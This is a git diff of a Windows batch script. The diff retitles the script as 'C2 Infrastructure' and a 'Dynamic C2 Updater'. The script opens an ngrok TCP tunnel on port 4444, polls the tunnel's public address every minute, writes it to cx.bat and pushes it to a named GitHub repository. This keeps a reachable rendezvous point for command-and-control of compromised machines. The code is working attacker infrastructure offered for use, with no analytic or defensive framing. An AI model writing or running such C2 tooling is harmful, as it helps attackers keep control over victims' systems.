@@ -1,81 +1,80 @@
 @echo off
 setlocal enabledelayedexpansion
-title Ngrok Auto-Update System (Active)
+title C2 Infrastructure - GitHub Sync System
 
 :: ==========================================
 :: 1. Configuration
 :: ==========================================
-:: Note: GITHUB_TOKEN is now pulled from System Environment Variables for security.
+:: Pulls GITHUB_TOKEN from Windows Environment Variables
 set "GH_USER=osmanius21-maker"
 set "GH_REPO=osm"
 set "LOCAL_PORT=4444"
-set "FILE_NAME=link.txt"
+set "MAIN_FILE=cx.bat"
 set "LOG_FILE=history.log"
 set "LAST_LINK=none"
 
 :: ==========================================
-:: 2. Launch Ngrok in Background
+:: 2. Launch Ngrok
 :: ==========================================
-echo [+] Initializing Ngrok on port %LOCAL_PORT%...
+echo [+] Starting Ngrok on port %LOCAL_PORT%...
 start /min cmd /c "ngrok tcp %LOCAL_PORT%"
-echo [+] Waiting 12 seconds for tunnel initialization...
-timeout /t 12 >nul
+echo [+] Waiting for tunnel to initialize (15s)...
+timeout /t 15 >nul
 
 :: ==========================================
-:: 3. Continuous Monitoring Loop
+:: 3. Monitoring & Auto-Update Loop
 :: ==========================================
 :monitor_loop
 cls
 echo ==========================================
-echo    NGROK AUTO-UPDATE MONITORING
+echo    GITHUB DYNAMIC C2 UPDATER
 echo ==========================================
-echo Status: Running... (Press CTRL+C to stop)
-echo Last Known Link: !LAST_LINK!
+echo Status: Active | Monitoring: %LOCAL_PORT%
+echo Current Registered Link: !LAST_LINK!
 echo ------------------------------------------
 
-:: Extract current link from Ngrok local API
+:: Extract the current Ngrok Public URL
 for /f "delims=" %%i in ('powershell -command "(Invoke-WebRequest -Uri 'http://192.168.1.20:4040/api/tunnels' | ConvertFrom-Json).tunnels.public_url"') do set "CURRENT_LINK=%%i"
 
-:: Check if Ngrok is down
+:: Check if Ngrok is running
 if "!CURRENT_LINK!"=="" (
-    echo [!] ALERT: Ngrok API not responding! 
-    echo [!] Attempting to restart Ngrok...
+    echo [!] ALERT: Ngrok is down! Restarting...
     start /min cmd /c "ngrok tcp %LOCAL_PORT%"
-    timeout /t 15 >nul
+    timeout /t 20 >nul
     goto monitor_loop
 )
 
-:: Compare current link with the last one pushed
+:: Check for changes
 if "!CURRENT_LINK!"=="!LAST_LINK!" (
-    echo [%date% %time%] No change detected. Link is stable.
+    echo [%time%] Connection stable. No update needed.
 ) else (
-    echo [%date% %time%] NEW LINK DETECTED: !CURRENT_LINK!
+    echo [%time%] CHANGE DETECTED: !CURRENT_LINK!
     
-    :: Update current link file
-    echo !CURRENT_LINK! > %FILE_NAME%
+    :: Update the main link file (Overwrite)
+    echo !CURRENT_LINK! > %MAIN_FILE%
     
-    :: Log the change with timestamp
-    echo [%date% %time%] New Tunnel: !CURRENT_LINK! >> %LOG_FILE%
+    :: Append to the history log (Log with Timestamp)
+    echo [%date% %time%] Updated to: !CURRENT_LINK! >> %LOG_FILE%
     
-    echo [+] Syncing with GitHub Repository...
+    echo [+] Syncing Main File and Log to GitHub...
+
+    :: Git Operations
+    git add %MAIN_FILE% %LOG_FILE%
+    git commit -m "Auto-Update: !CURRENT_LINK! (Logged)"
     
-    :: Git Commands using Token from Environment Variable
-    git add %FILE_NAME% %LOG_FILE%
-    git commit -m "Auto-Update: Tunnel changed to !CURRENT_LINK!"
-    
-    :: Secure Push using Environment Variable %GITHUB_TOKEN%
+    :: Secure Push using the Environment Variable Token
     git push https://%GH_USER%:%GITHUB_TOKEN%@github.com/%GH_USER%/%GH_REPO%.git main
     
     if !errorlevel! equ 0 (
         set "LAST_LINK=!CURRENT_LINK!"
-        echo [+] GitHub Updated Successfully.
+        echo [+] GitHub Repository Updated Successfully.
     ) else (
-        echo [-] Error: Failed to push to GitHub. Check your Internet or Token.
+        echo [-] ERROR: Push failed. Check your Token or Internet.
     )
 )
 
-:: Wait for 60 seconds before next check
+:: Check again after 60 seconds
 echo ------------------------------------------
-echo Next check in 60 seconds...
+echo Refreshing in 60 seconds...
 timeout /t 60 >nul
 goto monitor_loop
